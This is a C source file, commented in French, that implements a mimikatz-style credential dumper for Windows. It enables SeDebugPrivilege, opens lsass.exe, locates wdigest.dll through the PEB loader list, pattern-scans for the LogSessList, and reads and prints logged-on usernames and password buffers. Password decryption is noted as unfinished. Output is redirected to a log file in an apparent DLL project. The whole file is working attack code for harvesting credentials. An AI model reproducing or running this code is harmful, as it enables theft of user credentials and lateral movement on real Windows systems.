#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>
#include "WDigestInspector.h"

typedef DWORD (WINAPI CALLBACK *NtQueryInformationProcessPtr) (IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, OUT ULONG ProcessInformationLength, OUT OPTIONAL PULONG ReturnLength);
NtQueryInformationProcessPtr NtQueryInformationProcess;

HINSTANCE dllHandle = NULL;

BYTE pattern[] = { 0x74, 0x11, 0x8b, 0x0b, 0x39, 0x4e, 0x10 };
SIZE_T patternSize = sizeof(pattern);
INT lsassOffset = -7;
INT wdigestOffset = 32;
INT firstPointer = 0;
/*
	Fonction qui r�cup�re les identifiants utilisateurs contenus dans LSASS.exe (via WDigest)
*/
int getLogons(PLOGON logons, SIZE_T max)
{
	HMODULE hModule;
	PBYTE ptr;
	SIZE_T count = 0;
	INT errorCount = 0;
	INT readAfterError = 0;
	HANDLE process = NULL;
	PROCESS_BASIC_INFORMATION processInformations;
	LPVOID processInfoBuffer = &processInformations;
	ULONG szInfos;
	LDR_DATA_TABLE_ENTRY LdrEntry;
	PEB Peb;
	PEB_LDR_DATA LdrData;
	PBYTE aLire, fin;
	BOOL continueCallback = TRUE, found = FALSE;;
	UNICODE_STRING moduleName;
	HLOCAL buffer;
	SIZE_T nbrOfBytesRead = 0;
	PBYTE patternFirstAddr;
	PBYTE memToLookupTo;
	SIZE_T memSize;
	PWDIGEST_LIST_ENTRY logSessList = NULL;
	PVOID logSess = NULL;
	PWDIGEST_LIST_ENTRY it = NULL;
	PWDIGEST_LIST_ENTRY pLoginEntry = NULL;
	PVOID user = NULL;
	INT logonCount = 0;
	PWDIGEST_PRIMARY_CREDENTIAL pPC;
	PUNICODE_STRING pUserName = NULL;
	PUNICODE_STRING pPassword = NULL;

	// On v�rifie qu'on a bien acc�s au token SeDebugPrivilege
	// Sinon on n'aura pas acc�s � la m�moire de LSASS.exe
	if (getDebugPrivilege() == FALSE) {
		printf("Couldn't get debug privilege\n");
		goto end;
	}

	// On r�cup�re le processus en cours lsass.exe dans la m�moire
	DWORD processId = getProcessId("lsass.exe", &hModule);
	if (!processId) {
		printf("Couldn't find process. \n");
		goto end;
	}

	// On r�cup�re un handle sur le processus pr�c�dement trouv� gr�ce � son ID
	// Le flag PROCESS_QUERY_INFORMATION est indispensable pour r�cup�rer la table Process Environment Block (PEB)
	// le falg PROCESS_VM_READ est indispensable pour acc�der aux variables point�es par la table PEB
	process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
	if (!process) {
		printf("Couldn't open process. (%i)\n", GetLastError());
		goto end;
	}

	// On charge dynamiquement la biblioth�que ntdll
	dllHandle = LoadLibraryA("ntdll.dll");
	if (!dllHandle) {
		printf("couldn't load ntdll.dll (%i)\n", GetLastError());
		goto end;
	}
	// On r�cup�re la m�thode NtQueryInformationProcess via du chargement dynamique
	// Cette m�thode permet de r�cup�rer des informations sur les modules utilis�s par un processus
	// Elle permet notamment de r�cup�rer l'adresse de base d'une Dll en cours, ce qui permet d'analyser sa m�moire
	NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(dllHandle, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		printf("Couldn't load NtQueryInformationProcess. (%i)\n", GetLastError());
		goto end;
	}

	// On r�cup�re les informations sur le processus
	if (NtQueryInformationProcess(process, ProcessBasicInformation, processInfoBuffer, sizeof(PROCESS_BASIC_INFORMATION), &szInfos)
		|| (sizeof(PROCESS_BASIC_INFORMATION) != szInfos) || !processInformations.PebBaseAddress) {
		printf("Couldn't read information process (%i)\n", GetLastError());
		goto end;
	}

	// L'information qui nous int�resse est la table PEB
	// On a un pointeur vers celle-ci, mais ce pointeur fait r�f�rence � l'espace m�moire du processus LSASS, pas du notre
	// On doit donc lire le pointeur avec ReadProcessMemory pour stocker dans un buffer (Peb) la m�moire de lsass
	// On utilisera cette m�thode tout au long du programme
	if (!ReadProcessMemory(process, processInformations.PebBaseAddress, &Peb, sizeof(PEB), NULL)) {
		printf("Couldn't read PebBaseAddress (%i)\n", GetLastError());
		goto end;
	}

	// la PEB contient entre autres un pointeur vers la LDR, qui contient des informations sur les modules charg�s
	// On r�cup�re donc son contenu pour it�rer dessus
	if (!ReadProcessMemory(process, Peb.Ldr, &LdrData, sizeof(PEB_LDR_DATA), NULL)) {
		printf("Couldn't read Peb.Ldr (%i)\n", GetLastError());
		goto end;
	}

	// La LDR contient un pointeur vers le d�but d'une liste cha�n�e qui liste tous les modules charg�s
	// On va donc it�rer sur cette liste chain�e gr�ce au pointeur Flink (Follow link), qui pointe vers le prochain module
	// Les premiers octets de la table LDR_DATA_TABLE_ENTRY sont r�serv�s et donc inutiles, aLire est un pointeur vers le prochain pointeur utile
	// aLire = Adresse de la prochaine LDR ENTRY - les octets inutiles avant le pointeur

	// la fin de lecture se fait lorsqu'on a atteint la fin de la liste chain�e, soit le pointeur InLoadOrderModulevector
	// Ce pointeur est normalement marqu� comme "reserved" dans la doc Microsoft, mais mimikatz en a d�couvert l'utilit�, j'ai donc r�utilis� leurs structures
	// Note: on fait un - au lieu d'un + car les adresses vont de la plus haute vers la moins haute lorsqu'on lit un �l�ment de la pile en m�moire
	for (
		aLire = (PBYTE)(LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
		fin = (PBYTE)(Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
	(aLire != fin) && !found;
	aLire = (PBYTE)LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
		)
	{
		// On lit L'entr�e toujours depuis la m�moire de lsass
		if (!ReadProcessMemory(process, aLire, &LdrEntry, sizeof(LdrEntry), NULL)) {
			continue;
		}

		// On r�cup�re le pointeur vers la chaine de carat�res repr�sentant le nom de la dll
		moduleName = LdrEntry.BaseDllName;
		if (!(moduleName.Buffer = (PWSTR)LocalAlloc(LPTR, moduleName.MaximumLength))) {
			continue;
		}

		// On copie la chaine de caract�re dans la m�moire de notre propre processus
		if (!ReadProcessMemory(process, LdrEntry.BaseDllName.Buffer, moduleName.Buffer, LdrEntry.BaseDllName.Length, NULL)) {
			LocalFree(moduleName.Buffer);
			continue;
		}

		// On cherche le module WDigest car il contient dans sa m�moire le mot de passe utilisateur en clair
		// On v�rifie donc que le module est bien celui-ci, sinon on it�re au prochain
		if (_wcsicmp(moduleName.Buffer, L"wdigest.dll") == NULL) {
			printf("=====> WDIGEST.dll <======\n");
			found = TRUE;
		}
	}
	if (!found) {
		printf("Couldn't find wdigest \n");
		goto end;
	}

	ptr = (PBYTE)LdrEntry.DllBase;
	// C'est ici que la technique devient int�ressante:
	// Maintenant qu'on a acc�s � l'adresse de base de wdigest,
	// on va pouvoir aller lire sa m�moire
	// Pour retrouver les mots de passe dans la m�moire de cette Dll, on va d�rouler une suite d'actions

	// Premi�re �tape: Retrouver la liste cha�n�e contenant les identifiants utilisateurs
	//  * Pour ce faire on va chercher un sch�ma d'octets permettant d'identifier � coups s�rs cette cha�ne
	//  * Probl�matique: les binaires et donc l'espace m�moire de WDigest �volue en fonction des builds faits par microsofts
	//  * Le dev de mimikatz a identifi� un pattern qu'on retrouve dans toutes les versions de WDigest pour windows 7
	//  * Ce pattern se trouve � 6 octets de la liste cha�n�e LogSessList
	//  * Le pattern est le suivant: 0x74 0x11 0x8b 0x0b 0x39 0x4e 0x10

	// On alloue un buffer de 7 octets o� l'on stockera les tests dedans
	buffer = LocalAlloc(LPTR, patternSize);

	// On parcourt la m�moire de WDigest � partir de ptr qui repr�sente DllBase, le pointeur vers la premi�re case m�moire de WDigest
	// On v�rifie que la m�moire est identique au pattern avec RtlEqualMemory
	// Si ce n'est pas le cas, on d�cale le pointeur d'une case et on recommence
	do {
		if (!ReadProcessMemory(process, ptr, buffer, patternSize, NULL)){
			printf("error %i\n", GetLastError());
			goto end;
		}
		ptr++;
	} while (!RtlEqualMemory(pattern, buffer, patternSize));

	// Lorsqu'on a trouv� le pattern, on stocke le pointeur vers celui-ci dans patternFirstAddr
	patternFirstAddr = ptr--;

	// On se d�cale de 7 octets pour retrouver le pointeur vers la logSessList
	memToLookupTo = patternFirstAddr + lsassOffset;

	// Deuxi�me �tape: Maintenant qu'on a l'adresse du pointeur vers logSessList, on va r�cup�rer le contenu de logSessList
	//   * qui est lui-m�me un pointeur vers une structure de type WDIGEST_LIST_ENTRY
	if (!ReadProcessMemory(process, memToLookupTo, &logSessList, sizeof(PVOID), NULL)) {
		printf("Couldn't read logSessList ptr \n");
		goto end;
	}

	// On initialise notre it�rateur de la liste
	it = logSessList;
	// La sp�cificit� de cette liste est que deux structure se trouvent c�te � c�te en m�moire:
	// l'entr�e et les identifiants
	// Pour trouver les identifiants il suffit d'aller lire 32 octets apr�s la structure WDIGEST_LIST_ENTRY
	memSize = wdigestOffset + sizeof(WDIGEST_PRIMARY_CREDENTIAL);
	user = (PVOID)LocalAlloc(LPTR, memSize);
	pLoginEntry = (PWDIGEST_LIST_ENTRY)LocalAlloc(LPTR, sizeof(WDIGEST_LIST_ENTRY));
	INT i;
	for (i = 0; i < max; i++) {
		logons[i].UserName = NULL;
		logons[i].Password = NULL;
	}
	do {
		// On lit un item qu'on place dans pLoginEntry
		// Cette structure servira � se d�placer dans la liste chain�e
		if (!ReadProcessMemory(process, it, pLoginEntry, sizeof(WDIGEST_LIST_ENTRY), NULL)){
			printf("Couln't read pLoginEntry \n");
			goto end;
		}

		// On lit la m�me entr�e, mais pour y lire les donn�es utilisateurs cette fois-ci
		if (!ReadProcessMemory(process, it, user, memSize, NULL)){
			printf("Couldn't read user `\n");
			goto end;
		}

		// On lit les credentials en d�pla�ant l'adresse des donn�es de + wdigestOffset
		pPC = (PWDIGEST_PRIMARY_CREDENTIAL)((PBYTE)user + wdigestOffset);
		if (!pPC->UserName.Buffer && !pPC->Password.Buffer) {
			printf("No UserName nor Password for this entry\n");
		}
		
		// Ensuite on lit l'username et on l'affiche
		if (pPC->UserName.Buffer){
			pUserName = (PUNICODE_STRING)LocalAlloc(LPTR, sizeof(UNICODE_STRING));
			pUserName->Length = pPC->UserName.Length;
			pUserName->MaximumLength = pPC->UserName.MaximumLength;
			pUserName->Buffer = (PWSTR)LocalAlloc(LPTR, pPC->UserName.MaximumLength);
			if (!ReadProcessMemory(process, pPC->UserName.Buffer, pUserName->Buffer, pPC->UserName.MaximumLength, NULL)) {
				printf("Couldn't read username \n");
				LocalFree(pUserName->Buffer);
				continue;
			}
			else wprintf(L"Username: %s\n", pUserName->Buffer);
			logons[logonCount].UserName = pUserName;
			
		}
		// idem pour le mot de passe
		// NOTE: le mot de passe est chiffr�
		// pour le d�chiffrer, il faut r�cup�rer dans la m�moire:
		//  - InitializationVector
		//  - LsaUnprotectMemory
		//  - Il suffit ensuite de d�chiffrer le mot de passe
		// Je n'ai pas eu le temps d'aller jusque l� malheureusement.
		if (pPC->Password.Buffer){
			pPassword = (PUNICODE_STRING)LocalAlloc(LPTR, sizeof(UNICODE_STRING));
			pPassword->Buffer = (PWSTR)LocalAlloc(LPTR, pPC->Password.MaximumLength);
			pPassword->Length = pPC->Password.Length;
			pPassword->MaximumLength = pPC->Password.MaximumLength;
			if (!ReadProcessMemory(process, pPC->Password.Buffer, pPassword->Buffer, pPC->Password.MaximumLength, NULL)) {
				printf("Couldn't read password \n");
				LocalFree(pPassword->Buffer);
				continue;
			}
			else wprintf(L"Password: %s \n", pPassword->Buffer);
			logons[logonCount].Password = pPassword;
		}
		it = pLoginEntry->Flink;
		logonCount++;
	} while (it != logSessList && (unsigned int)logonCount <= max);

end:
	if (process) CloseHandle(process);
	if (dllHandle) CloseHandle(dllHandle);
	if (user) LocalFree(user);
	if (logSessList) LocalFree(pLoginEntry);
	return 0;
}

void setLogFile() {
	char filename[] = "C:\\Users\\admin\\Documents\\Dll\\YoloDll\\use_yolo_log.22.txt";
	FILE *out;
	freopen_s(&out, filename, "a+", stdout);
	printf("setLogFile OK.\n");
}

/*
* Fonction qui r�cup�re l'id d'un processus en fonction de son nom
*/
DWORD getProcessId(char *processName, HMODULE *hModule) {
	DWORD processIds[0x1000];
	DWORD bytesReturned;
	DWORD i;
	unsigned int j;
	HANDLE process;
	HMODULE hModules[1024];
	DWORD cbNeeded = NULL;
	BOOL found;
	TCHAR szModName[MAX_PATH];

	// On r�cup�re la liste des processus dans un tableau processIds
	EnumProcesses(processIds, 0x1000, &bytesReturned);

	// On it�re sur tous ces processus 
	for (i = 0; i < bytesReturned; i++) {
		// On v�rifie que l'id n'est pas null, qu'on peut bien ouvrir le process et qu'on peut lister les modules du processus
		if (processIds[i] == NULL || (process = OpenProcess(0x410, 0, processIds[i])) == NULL ||
			EnumProcessModules(process, hModules, sizeof(hModules), &cbNeeded) == NULL) {
			continue;
		}

		found = false;
		// Avec la liste des modules list�s pour un processus, on va pouvoir effectuer la correpondance avec le module souhait�
		for (j = 0; j < (cbNeeded / sizeof(HMODULE)); j++) {
			// On r�cup�re le nom du module
			if (GetModuleBaseNameA(process, hModules[j], (LPSTR)szModName, sizeof(szModName) / sizeof(TCHAR)) == NULL) {
				continue;
			}
			// On compare en ignorant la casse
			if (_strnicmp((const char *)szModName, processName, 10) != NULL){
				continue;
			}
			found = true;
			// Si le nom est le bon, on sauvegarde l'adresse de base du module pour r�utilisation future
			if (hModule) {
				*hModule = hModules[j];
			}
			break;
		}

		if (found) {
			printf("Found %s !\n", processName);
			CloseHandle(process);
			return processIds[i];
		}
	}
	return NULL;
}

/*
Fonction r�cup�r�e sur le MSDN
*/
BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid))
	{
		return FALSE;
	}

	//Get the current privilege setting
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;

	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &tpPrevious, &cbPrevious))
	{
		//Now set the new privilege setting
		tpPrevious.PrivilegeCount = 1;
		tpPrevious.Privileges[0].Luid = luid;

		if (bEnablePrivilege)
		{
			tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
		}
		else
		{
			tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &  tpPrevious.Privileges[0].Attributes);
		}

		if (AdjustTokenPrivileges(hToken, FALSE, &tpPrevious, cbPrevious, NULL, NULL))
		{
			return TRUE;
		}
	}
	return FALSE;
}

int getDebugPrivilege() {
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE hToken;
	OpenProcessToken(currentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (SetPrivilege(hToken, SE_DEBUG_NAME, TRUE) == TRUE) {
		return TRUE;
	}
	return FALSE;
}

/*
* Fonction utilitaire pour afficher un buffer en hexad�cimal
*/
void print_buffer(BYTE *buffer, SIZE_T size) {
	SIZE_T cnt = 0;
	printf("(%i bytes): \n", size);
	for (unsigned int i = 0; i < size; i++) {
		printf("%02x ", ((BYTE *)buffer)[i]);
		cnt++;
		if (cnt % 8 == 0)
			printf(" ");
		if (cnt % 16 == 0)
			printf("\n");
	}
	printf("\n");
}
